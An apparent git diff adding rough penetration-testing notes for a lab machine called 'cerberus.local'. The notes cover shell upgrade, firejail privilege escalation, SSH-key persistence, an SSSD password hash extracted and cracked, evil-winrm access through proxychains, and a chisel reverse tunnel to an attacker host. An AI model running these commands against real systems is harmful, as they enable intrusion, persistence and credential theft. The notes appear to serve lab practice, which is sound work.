@@ -110,3 +110,64 @@ icinga
 for privilege escalation
 https://seclists.org/oss-sec/2022/q2/188
 
+after creating a python spawn shell the exploit worked
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+![](20230624055937.png)
+
+firejail --join=9159
+su -
+
+
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0fQqdcN8qxqB3OH9lCBMyGcAz+c8a5uRxuvif1A98/jv5LLYy/2GO7r68nHOSIviFtkbnydmuTyzBBSWhbxC/MWAX8XZx5C3rF598/phDzwN4seus2SMhZi5zUZ6iylBBI8xht5J+u/InI6BlsXQ65H3xw+yFxndxeKi3Gu17glt3OEe8aAPaxj3qU89L1xbOr4m3mSqnhJne7eV05nqYvZDHP+pgOQE02dmmplRfTHCKbEfwqY/nDx7QWw6WtrQigNlEGNcWJUVKNlXBGoGHZuyHNMpoh4XjinLeM9GKFY4xRxk2CyFBLwlouOtj7s5EtFB5CLnaQMpDtzI+gJyma7nzxJZxELrlTHyjPJoQHQSmlQe+tBNBRAEL92wac79psK7s3PARdCcyEnpe8l9cplPP8YIS8tMg6BVVjTGPQNN0BJBwRxEjrvAKae1phztkQD7tZKy3aEl8VCUR8tpJ0fw0mK6/PJGxgCYXZWWKwycHOnJKQYDL17qsTypaLL8= kali@kali" >> authorized_keys
+
+
+
+```
+strings cache_cerberus.local.ldb
+
+name=matthew@cerberus.local,cn=users,cn=cerberus.local,cn=sysdb
+&DN=@INDEX:GIDNUMBER:1000
+@INDEX:GIDNUMBER:1000
+@IDXVERSION
+@IDX
+name=matthew@cerberus.local,cn=users,cn=cerberus.local,c
+matthew@cerberus.local
+objectCategorycere
+achedPassword
+$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0
+cachedPasswordType
+lastCachedPasswordChange
+1677672476
+
+```
+
+$6$6LP9gyiXJCovapcy$0qmZTTjp9f2A0e7n4xk0L6ZoeKhhaCNm0VGJnX/Mu608QkliMpIy1FwKZlyUJAZU3FZ3.GQ.4N6bb9pxE3t3T0
+
+147258369
+
+matthew:147258369
+
+using evilwinrm
+
+https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/
+
+proxychains evil-winrm -u matthew -p 147258269 -i 172.16.22.1
+
+trying evil winrm on dc with prooxychains
+
+https://hack.technoherder.com/chisel/
+
+sudo ./chisel server -p 8081 --reverse 
+- on attacker
+
+./chisel client 10.10.16.24:8001 R:1080:socks
+ - on victim
+
+on attacker
+sudo nano /etc/proxychains4.conf
+# Add this following line at the bottom
+socks5   127.0.0.1   1080
+
+how to add attacker ot proxychains is what i need to look into
+
